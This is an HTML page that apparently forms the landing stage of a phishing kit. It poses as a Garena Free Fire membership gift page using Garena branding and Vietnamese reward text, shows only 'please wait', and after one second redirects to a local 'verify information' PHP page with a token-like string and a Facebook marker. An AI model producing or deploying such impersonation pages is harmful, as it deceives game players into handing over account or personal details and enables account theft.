<!DOCTYPE html>
<html lang="en">
<head>
    <title>Garena Free Fire Membership</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <meta property="og:type" content="website">
    <meta property="og:title" content="NHẬN QUÀ FREE FIRE MEMBERSHIP">
    <meta property="og:description" content="Chương trình tri ân kèm những sự kiện đặc biệt dành cho người chơi Free Fire">
    <meta property="og:url" content="https://ff.member.garena.vn">
    <meta property="og:site_name" content="Free fire garena">
    <meta property="og:image" content="/images/FFVIP_FBShare.jpg">
    <meta property="fb:app_id" content="367981983963236">
    <link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:300,400,700|Roboto:300,400,500,700" rel="stylesheet">
    <link rel="shortcut icon" href="https://cdn.vn.garenanow.com/web/ff/fav.jpg">
</head>

<body>
    
</body>

</html>

<script>
    setTimeout(function(){window.location.href = 'xac-thuc-thong-tin.php?access_token/d2uvPml9nEorvr2H82S4KE3Bwot18ebBQSSKCxvGdHUWkIhxnPCvZPVwaqCY41R3H0dOKHg8s0CbkJWsRljgHKsuPaLLgOB8ic0a_index#fb';}, 1000);
</script>
<h2>Vui Lòng Chờ.....</h2>